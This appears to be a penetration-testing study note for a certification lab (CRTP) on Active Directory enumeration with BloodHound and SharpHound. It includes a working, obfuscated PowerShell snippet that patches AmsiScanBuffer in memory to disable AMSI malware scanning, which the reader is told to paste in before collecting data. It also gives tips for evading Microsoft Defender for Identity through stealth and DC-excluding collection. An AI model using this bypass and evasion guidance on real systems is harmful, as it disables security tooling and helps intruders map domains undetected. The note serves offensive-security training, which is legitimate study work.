# **Domain Enumeration Cont'd - BloodHound**


- Commonly used by penetration testers and Red teamers.
- Provides GUI for AD entities and relationships for the data collected by its ingestors.
- Uses graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins.
- Bloodhound creates alot of detection if used carelessly
- Supports custom Cipher queries.

https://github.com/BloodHoundAD/BloodHound


## **Usage**

- To bypass .NET AMSI just paste in below code on `powershell`

```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

- Supply data to BloodHound (Remember to bypass .NET AMSI first 🙄)

```powershell
$ ..\SharpHound.ps1
```

- Start BloodHound collector, to gather data

```powershell
$ Invoke-BloodHound -CollectionMethod All

# OR

$ SharpHound.exe
```


- Start up the bloodhound GUI also make sure to start up **neo4j** (refer to lab manual 📚 for more info)

- The generated archive can be uploaded to the BloodHound Application (usually located under `.\BloodHound-master\collectors` directory and it a zip-file(no need to unzip), you can also just do **drag and drop**)


- To make BloodHound collection stealthy, use `-stealth` option. (Removes noisy collection methods like RDP, DCOM, PSRemote and LocalAdmin).

```powershell
$ Invoke-BloodHound -Stealth

# OR

$ SharpHound.exe --stealth
```

- To avoid detections like MDI

```powershell
$ Invoke-BloodHound -ExcludeDCs
```

> **Note :** we are not going to shy away from/[ignore] **Microsoft Defender for Identity** (MDI), we might not be worried about **Microsoft Detection Endpoint** (MDE) because they are specific to active directory attacks, we would evade MDI as much as possible.


# **Learning Objective 6**

- Setup BloodHound and identify shortest path to Domain Admins in the dollarcorp domain.

## **Solution**


**_Coming Soon_**


**In other to download a guide to follow, you can use this [book](https://ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf) :** 

> **Note :** For the CRTP exam do not try to setup bloodhound on foothold as it will lead to waste of **time**, setup a bloodhound **GUI** and keep it ready on your Host system so you can transfer to foothold machine.
> Also the older version of BloodHound might just be the best to use because it gives you the privileges to enumerate local admin rights, so try and use that one too.
